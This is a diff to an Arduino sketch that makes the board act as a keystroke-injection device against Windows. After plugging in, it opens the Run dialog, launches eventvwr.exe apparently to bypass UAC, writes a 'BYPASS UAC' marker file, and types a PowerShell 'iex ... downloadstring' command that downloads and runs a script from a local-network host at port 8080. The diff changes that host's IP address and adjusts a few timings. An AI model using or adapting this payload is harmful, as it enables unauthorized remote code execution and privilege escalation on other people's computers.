@@ -3,6 +3,10 @@ void setup(){
   Keyboard.begin();
   delay(10000);
   Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(100);
@@ -20,15 +24,12 @@ void setup(){
   delay(100);
   Keyboard.println("start eventvwr.exe");
   Keyboard.println("exit");
-  delay(500);
+  delay(1000);
   Keyboard.println("echo \"BYPASS UAC\" > C:\\QUACKED.txt");
   delay(100);
-  Keyboard.println("iex (new-object net.webclient).downloadstring('http://192.168.1.38:8080/W1Nd0WsP0WN3D')");
+  Keyboard.println("iex (new-object net.webclient).downloadstring('http://192.168.1.36:8080/W1Nd0WsP0WN3D')");
   Keyboard.println("exit");
   Keyboard.end();
-
 }
 
-void loop(){
-
-}
+void loop(){}
